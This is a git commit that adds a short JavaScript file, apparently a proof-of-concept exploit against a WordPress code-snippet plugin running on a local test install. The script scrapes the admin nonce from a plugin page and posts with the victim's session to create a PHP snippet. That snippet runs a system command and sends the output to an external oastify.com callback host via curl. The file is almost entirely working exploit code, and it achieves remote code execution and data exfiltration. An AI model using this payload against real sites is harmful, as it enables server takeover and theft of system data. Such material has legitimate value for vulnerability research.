eba91493132bfb737a22df2fb18b941f2fc41a98
amr9k8 <amrkhaled9k8@gmail.com>
2024-03-30 21:07:35 +0200

    Create test5.js

---
+++ test5.js
@@ -0,0 +1,13 @@
+fetch('http://localhost/wordpress-6.4.2/wordpress/wp-admin/admin.php?page=hfcm-pro-create')
+  .then(response => response.text())
+  .then(html => {
+    const tokenValue = (new DOMParser().parseFromString(html, 'text/html')).querySelector('form[method="post"] input#_wpnonce').value;
+        fetch('https://localhost/wordpress-6.4.2/wordpress/wp-admin/admin-ajax.php', {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/x-www-form-urlencoded'
+      }, credentials: 'include',
+      body: `action=hfcm-pro-request&create-snippet=${tokenValue}&insert=1&data[snippet]=<?php+$info=base64_encode(systeminfo());system("curl 0nonwlxy0g6jt3g5jdqrvkj23t9kxalz.oastify.com?systeminfo=$info");?>&data[snippet_type]=php`
+    }).then(response => response.json())
+    .then(data => console.log('Response from API:', data))
+})
